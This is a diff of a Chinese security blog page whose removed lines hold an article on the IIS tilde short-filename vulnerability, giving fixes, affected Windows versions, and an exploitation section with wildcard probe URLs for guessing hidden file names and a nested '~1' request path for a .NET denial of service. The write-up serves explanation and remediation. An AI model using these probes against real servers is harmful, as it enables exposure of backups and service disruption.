-<figure><img src="media/15446866501207/%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%98%BE%E7%A4%BA.png" alt="短文件名显示"/><figcaption>短文件名显示</figcaption></figure></p>
-
-<h2 id="toc_3">修复方案</h2>
-
-<hr/>
-
-<p>1、升级 .net framework 至 4.0 版本或以上<br/><br/>
-2、修改注册表键值<br/><br/>
-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem 修改NtfsDisable8dot3NameCreation为1。（此项默认为0）<br/><br/>
-此设置用于禁用短文件名功能，重启后生效。<br/><br/>
-或者通过 CMD 命令：    </p>
-
-<pre class="line-numbers"><code class="language-txt">Windows Server 2008 R2
-查询是否开启短文件名功能：fsutil 8dot3name query
-关闭该功能：fsutil 8dot3name set 1
-
-Windows Server 2003
-关闭该功能：fsutil behavior set disable8dot3 1
-</code></pre>
-
-<p>以上操作只能防止新创建的文件/文件名不会出现短文件名，而当前文件/文件名依然保持短文件名。完整解决方案还需要如下操作：<br/><br/>
-3、<br/><br/>
-　　a、从当前目录中创建一个副本,并将其重命名为 tempNew；<br/><br/>
-　　b、将当前目录重命名为“tempOld”；<br/><br/>
-　　c、将“tempNew”重命名为原来的目录名。<br/><br/>
-4、禁止 url 中使用 “~” 或它的 Unicode 编码。（IIS7.0的请求阻塞不能完全阻止“~”波浪号。）</p>
-
-<hr/>
-
-<hr/>
-
-<hr/>
-
-<h2 id="toc_4">背景知识</h2>
-
-<hr/>
-
-<p>windows 支持的长文件名最多为 255 个字符。windows 还以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位 windows 的程序访问这些文件。<br/><br/>
-8.3格式短文件名规范中：<br/><br/>
-‘8’是指文件名或目录名的主体部分小于等于 8 个字节；‘3’是指文件名的扩展名部分小于等于 3 个字节。<br/><br/>
-windows 会按以下方式从长文件名生成短文件名：<br/><br/>
-windows 首先会删除文件名中的任何无效字符和空格。无效字符包括：</p>
-
-<pre class="line-numbers"><code class="language-txt">.&quot;/\[]:;=,
-</code></pre>
-
-<p>由于短文件名只能包含一个英文句点（.），因此 windows 将删除文件名中的其他英文句点，即使文件名中最后一个英文句点后面是有效的非空格字符也是如此。例如：windows 从长文件名 This is a really long filename.123.456.789.txt 生成短文件名 Thisis~1.txt 否则，windows 将忽略最后一个英文句点，而使用倒数第二个英文句点。例如：windows从长文件名 This is a really long filename.123.456.789. 生成短文件名 Thisis~1.789。<br/><br/>
-生成短文件名若需要复制的话，windows 将文件名截断为 6 个字符，并在后边附加一个波形符号（~）和一个数字（创建的每一个以 ~1 结尾的唯一文件名，复制文件以 ~2、~3等结尾。）    </p>
-
-<h2 id="toc_5">影响范围</h2>
-
-<hr/>
-
-<p>Windows 10 Pro released in July 2015Windows 10 Enterprise released in July 2015Microsoft Windows Server 2003 Standard EditionMicrosoft Windows Server 2003 Enterprise EditionMicrosoft Windows Server 2003 Datacenter EditionMicrosoft Windows Server 2003 Web EditionMicrosoft Windows Server 2003, Enterprise x64 EditionMicrosoft Windows Small Business Server 2003 Standard EditionMicrosoft Windows Small Business Server 2003 Premium EditionMicrosoft Windows XP Home EditionMicrosoft Windows XP Professional EditionMicrosoft Windows Datacenter Server Limited EditionMicrosoft Windows Advanced Server, Limited EditionMicrosoft Windows 2000 ServerMicrosoft Windows 2000 Advanced ServerMicrosoft Windows 2000 Professional EditionMicrosoft Windows NT Workstation 3.5Microsoft Windows NT Workstation 3.51Microsoft Windows NT Workstation 4.0 开发员版Microsoft Windows NT Server 3.51Microsoft Windows NT Server 4.0 Standard EditionWindows Vista Service Pack 2Windows Vista BusinessWindows Vista EnterpriseWindows Vista Home PremiumWindows Vista UltimateWindows Server 2008 Service Pack 2Windows Server 2008 StandardWindows Server 2008 EnterpriseWindows Server 2008 DatacenterWindows Server 2008 for Itanium-Based SystemsWindows 7 Service Pack 1Windows 7 Home PremiumWindows 7 ProfessionalWindows 7 EnterpriseWindows 7 UltimateWindows Server 2008 R2 Service Pack 1Windows Server 2008 R2 StandardWindows Server 2008 R2 EnterpriseWindows Server 2008 R2 DatacenterWindows Server 2008 R2 for Itanium-Based SystemsWindows 8 EnterpriseWindows 8 ProWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 DatacenterWindows Server 2012 DatacenterWindows Server 2012 DatacenterWindows Server 2012 Datacenter<br/>
-列表内所有操作系统均受影响（数据来源日期：20171213）<br/><br/>
-该漏洞有其局限性：<br/><br/>
-1、只能猜解文件/文件夹名前六位，以及扩展名前三位<br/><br/>
-2、名称较短的文件是没有响应的短文件名的<br/><br/>
-3、需要 IIS 和 .net 同时满足。  </p>
-
-<h2 id="toc_6">漏洞详情</h2>
-
-<hr/>
-
-<p>在 windows 上的 Apache（Apache支持短文件名）上运行的 web 应用程序正在创建一个长文件名文件（如sql备份文件或会话文件，假设文件名是 backup-082119f75623eb7abd7bf357698ff66c.sql，windows 将创建短文件名 BACKUP〜1.SQL）。这种情况下，如果我们用短文件名访问这个文件，那么就有可能获取这个包含sql数据库备份的文件。<br/><br/>
-比较著名的一个例子：<br/><br/>
-wordpress 有一个备份博客的插件，该插件会为备份创建一个自定义目录（backup-88456）。备份完成后，该目录包含一个名为 wordpress_wp_20120702_576.sql 的文件  ，即 WordPress 数据库备份。这本应该难以猜测的，因为我们的目录名称中有5个数字加上日期和另外3个数字，即使忽略日期也至少有 100,000,000 个组合。然而由于短文件名的原因，目录名会变成 BACKUP~1 而文件名会变成 WORDPR~1.SQL。100,000,000 个组合被缩减为一个组合。    </p>
-
-<h2 id="toc_7">漏洞利用</h2>
-
-<hr/>
-
-<p><strong>短文件名漏洞</strong><br/>
-漏洞利用需要使用到通配符。在 windows 中，* 可以匹配n个字符（n可以为0,一个星号和n个星号的意义一样）。判断某站点是否存在 IIS 短文件名爆破，构造如下payload：    </p>
-
-<pre class="line-numbers"><code class="language-http">1. http://www.xxx.com/*~1*/.aspx
-2. http://www.xxx.com/l1j1e*~1*/.aspx
-</code></pre>
-
-<p>若1返回404而2返回400，则可以判断目标站点存在漏洞。<br/><br/>
-判断漏洞存在后，继续猜解目录下是否存在a开头的文件或文件夹，访问：    </p>
-
-<pre class="line-numbers"><code class="language-http">http://www.xxx.com/a*~1*/.aspx
-</code></pre>
-
-<p>若存在将返回404，不存在则返回400。以此类推，不断向下猜解所有的6个字符。<br/><br/>
-到此要考虑两种情况，若abcdef开头的是一个文件夹则    </p>
-
-<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*/~1/.aspx
-</code></pre>
-
-<p>返回404。若abcdef开头的是一个文件，则    </p>
-
-<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*~1/.aspx
-</code></pre>
-
-<p>返回404（注意！返回404表示存在）同理我们可以猜出文件后缀名：    </p>
-
-<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*~1*h*/.aspx
-</code></pre>
-
-<p>若返回404则代表扩展名中肯定存在h字符。<br/><br/>
-利用此漏洞可以猜解后台地址、敏感文件/文件名（如备份的rar、bak、sql等）；某些情况下，可以通过短文件名漏洞直接下载对应的文件（如备份sql文件）。<br/><br/>
-<br><br/>
-<strong>.Net Framework 拒绝服务攻击</strong><br/><br/>
-当请求文件夹名称包含 ~1 的请求，会导致不存在该文件的 .Net Framework 去递归查询所有根目录。如果只有一个“~1”是无效的，当“~1”大于一个，比如像这样：        </p>
-
-<pre class="line-numbers"><code class="language-http">\wwwtest\fuck~1\~1\~1\~1.aspx
-</code></pre>
-
-<p>此时文件系统会这样调用：    </p>
-
-<pre class="line-numbers"><code class="language-txt">\wwwtest                           SUCCESS
-\wwwtest\fuck~1\~1\~1\~1           PATH NOT FOUND
-\wwwtest\fuck~1                    NAME NOT FOUND
-\wwwtest\fuck~1\~1\                PATH NOT FOUND
-\wwwtest\fuck~1\~1\~1\             PATH NOT FOUND
-\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
-\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
-\wwwtest\fuck~1\~1\~1              PATH NOT FOUND
-\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
-\wwwtest\fuck~1\~1\~1              PATH NOT FOUND
-\wwwtest\fuck~1\~1                 PATH NOT FOUND
-\wwwtest\fuck~1                    NAME NOT FOUND
-\wwwtest                           SUCCESS
-\wwwtest                           SUCCESS
-</code></pre>
-
-<p>如果我们请求的文件/文件夹名同时存在大小写时，这个请求会被请求两次，一次是原封不动的请求，一次是全部使用小写的请求。<br/><br/>
-下表显示了每个请求的FS调用的数量（Windows 2008 R2, IIS 7.5(latest patch – June 2012), and .Net framework 4.0.30319 (在别的系统下可能会不同)）<br/><br/>
-<figure><img src="media/15446866501207/F5%E8%B0%83%E7%94%A8.png" alt="F5调用"/><figcaption>F5调用</figcaption></figure></p>
-
-<p>这个问题适用于当时的 .Net framework 的所有版本(<br/><br/>
-    IIS 1.0, Windows NT 3.51<br/><br/>
-    IIS 2.0, Windows NT 4.0<br/><br/>
-    IIS 3.0, Windows NT 4.0 Service Pack 2<br/><br/>
-    IIS 4.0, Windows NT 4.0 Option Pack<br/><br/>
-    IIS 5.0, Windows 2000<br/><br/>
-    IIS 5.1, Windows XP Professional and Windows XP Media Center Edition<br/><br/>
-    IIS 6.0, Windows Server 2003 and Windows XP Professional x64 Edition<br/><br/>
-    IIS 7.0, Windows Server 2008 and Windows Vista<br/><br/>
-    IIS 7.5, Windows 7 (error remotely enabled or no web.config)<br/><br/>
-    IIS 7.5, Windows 2008 (classic pipeline mode))<br/><br/>
-只是 F5 的调用次数会有不同。    </p>
-
-<h2 id="toc_8">参考链接</h2>
-
-<hr/>
-
-<ul>
-<li><a href="http://www.lijiejie.com/iis-win8-3-shortname-brute/">http://www.lijiejie.com/iis-win8-3-shortname-brute/</a><br/></li>
-<li><a href="https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/">https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/</a><br/></li>
-<li><a href="http://www.freebuf.com/articles/4908.html">http://www.freebuf.com/articles/4908.html</a><br/></li>
-<li><a href="https://support.microsoft.com/zh-cn/help/121007/how-to-disable-8-3-file-name-creation-on-ntfs-partitions">https://support.microsoft.com/zh-cn/help/121007/how-to-disable-8-3-file-name-creation-on-ntfs-partitions</a><br/></li>
-<li><a href="https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf">https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf</a><br/></li>
-</ul>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2018/12/13 15:37 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
               
 
 
@@ -1218,6 +1613,18 @@ wordpress 有一个备份博客的插件，该插件会为备份创建一个自�
 	      
 		      
 			      <li class="post">
+			        <a href="15590908841596.html">学习的深度和广度</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15590262822391.html">洞察-宜信集应用系统资产管理、漏洞全生命周期管理、安全知识库管理三位一体的平台的安装与使用</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
 			        <a href="15589173721679.html">svn 报错：“svn: E155015: Commit failed (details follow):svn: E155015: Aborting commit: '/Users/lonelyor/xxx.xls' remains in conflict” 解决方法</a>
 			      </li>
 		     
@@ -1231,18 +1638,6 @@ wordpress 有一个备份博客的插件，该插件会为备份创建一个自�
 		      
 			      <li class="post">
 			        <a href="15586660103989.html">使用GET方法传输用户账号密码的危害</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15586605529996.html">验证码安全</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15585815946395.html">万能密码</a>
 			      </li>
 		     
 		  
